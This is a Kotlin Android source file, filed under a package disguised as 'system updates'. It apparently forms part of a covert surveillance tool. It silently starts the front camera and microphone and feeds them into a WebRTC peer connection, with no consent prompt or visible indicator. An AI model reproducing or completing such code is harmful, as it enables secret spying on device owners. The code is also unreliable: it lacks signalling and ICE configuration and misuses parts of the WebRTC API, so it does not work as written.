package com.system.updates.modules

import android.content.Context
import android.util.Base64
import org.webrtc.*
import java.nio.ByteBuffer
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class WebRTCStreamer {
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var videoSource: VideoSource? = null
    private var audioSource: AudioSource? = null
    private var localVideoTrack: VideoTrack? = null
    private var localAudioTrack: AudioTrack? = null
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    fun startStreaming(context: Context): String {
        return try {
            initializePeerConnectionFactory(context)
            createLocalTracks(context)
            createPeerConnection()
            "Streaming started"
        } catch (e: Exception) {
            "Streaming failed: ${e.message}"
        }
    }

    private fun initializePeerConnectionFactory(context: Context) {
        val options = PeerConnectionFactory.InitializationOptions.builder(context)
            .setEnableInternalTracer(true)
            .createInitializationOptions()
        PeerConnectionFactory.initialize(options)

        val encoderFactory = DefaultVideoEncoderFactory(context, true, true)
        val decoderFactory = DefaultVideoDecoderFactory(context)
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setVideoEncoderFactory(encoderFactory)
            .setVideoDecoderFactory(decoderFactory)
            .createPeerConnectionFactory()
    }

    private fun createLocalTracks(context: Context) {
        val eglBase = EglBase.create()
        val videoCapturer = createVideoCapturer(context)
        videoSource = peerConnectionFactory?.createVideoSource(videoCapturer!!.isScreencast)
        videoCapturer.initialize(videoSource?.surfaceTextureHelper, context, videoSource?.capturerObserver)
        videoCapturer.startCapture(1280, 720, 30)

        localVideoTrack = peerConnectionFactory?.createVideoTrack("video_track", videoSource!!)

        val audioConstraints = MediaConstraints()
        audioSource = peerConnectionFactory?.createAudioSource(audioConstraints)
        localAudioTrack = peerConnectionFactory?.createAudioTrack("audio_track", audioSource!!)
    }

    private fun createVideoCapturer(context: Context): VideoCapturer? {
        val cameraEnumerator = Camera2Enumerator(context)
        val deviceNames = cameraEnumerator.deviceNames
        for (name in deviceNames) {
            if (cameraEnumerator.isFrontFacing(name)) {
                return cameraEnumerator.createCapturer(name, null)
            }
        }
        return null
    }

    private fun createPeerConnection() {
        val rtcConfig = PeerConnection.RTCConfiguration(emptyList())
        rtcConfig.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
        peerConnection = peerConnectionFactory?.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onSignalingChange(state: PeerConnection.SignalingState) {}
            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState) {}
            override fun onIceConnectionReceivingChange(receiving: Boolean) {}
            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState) {}
            override fun onIceCandidate(candidate: IceCandidate) {}
            override fun onAddStream(stream: MediaStream) {}
            override fun onRemoveStream(stream: MediaStream) {}
            override fun onDataChannel(channel: DataChannel) {}
            override fun onRenegotiationNeeded() {}
        })
        peerConnection?.addTrack(localVideoTrack)
        peerConnection?.addTrack(localAudioTrack)
    }

    fun stopStreaming() {
        executor.execute {
            peerConnection?.close()
            peerConnectionFactory?.dispose()
        }
    }
}